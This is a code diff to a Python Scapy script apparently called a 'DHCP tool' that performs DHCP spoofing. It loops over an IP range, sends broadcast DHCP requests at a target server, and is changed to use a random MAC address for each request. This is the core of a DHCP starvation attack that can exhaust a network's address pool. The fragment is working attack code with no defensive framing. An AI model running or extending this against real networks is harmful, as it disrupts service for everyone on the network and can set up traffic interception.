@@ -14,10 +14,10 @@ def main(args):
     print "[+] starting DHCP spoofing"
 
     for ip in IPNetwork(args.ip_range):
-        mac = "28:C6:3F:32:41:6F"
+        mac = RandMAC()
         mac_raw = mac.replace(':', '').decode('hex')
 
-        request = Ether(src="28:C6:3F:32:41:6E", dst="ff:ff:ff:ff:ff:ff") \
+        request = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") \
                   / IP(src="0.0.0.0", dst="255.255.255.255") \
                   / UDP(sport=68, dport=67) \
                   / BOOTP(chaddr=mac_raw, xid=RandInt()) \
@@ -44,7 +44,7 @@ def list_network_interfaces():
 
 
 if __name__ == "__main__":
-    parser = ArgumentParser(description="DHCP tool", epilog=list_network_interfaces(), formatter_class=RawTextHelpFormatter)
+    parser = ArgumentParser(description="DHCP tool", formatter_class=RawTextHelpFormatter)
     parser.add_argument("iface", type=str, help="network interface to use")
     parser.add_argument("server", type=str, help="dhcp server to spoof against")
     parser.add_argument("ip_range", type=str, help="range of ip's to spoof against")
